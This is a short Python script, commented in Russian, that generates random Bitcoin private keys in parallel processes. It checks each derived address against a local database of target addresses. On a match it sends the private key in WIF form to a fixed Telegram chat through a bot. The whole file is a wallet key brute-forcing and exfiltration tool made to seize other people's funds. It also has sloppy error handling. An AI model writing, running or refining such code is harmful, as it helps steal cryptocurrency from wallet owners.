from bit import Key
from multiprocessing import Process
import sqlite3
import telebot  # https://github.com/eternnoir/pyTelegramBotAPI
                # pip install pyTelegramBotAPI
                # Для обновления воспользуйтесь командой
                # pip install pytelegrambotapi --upgrade


bot = telebot.TeleBot('')

db = sqlite3.connect('partners.db')
Connection = sqlite3.connect(':memory:')
db.backup(Connection)
sql = Connection.cursor()
# db.close()


# сколько процессов?
N_PROCESSES = 3


def main():
    try:
        k = Key()
        name = k.address
        wallet = k.to_wif()
        sql.execute("SELECT name FROM friends WHERE name = ?", [name])
        if sql.fetchone() is None:
            pass
        else:
            print('Да!', name)
            bot.send_message('409229183', wallet)
    except:
        pass


if __name__ == '__main__':
    while 1:
        procs = []
        for worker_id in range(N_PROCESSES):
            # создадим процесс, передав рабочего и аргументы
            proc = Process(target=main)
            proc.start()
            procs.append(proc)
        # будем ждать пока все процессы не завершаться
        for proc in procs:
            proc.join()  # ждет процесс
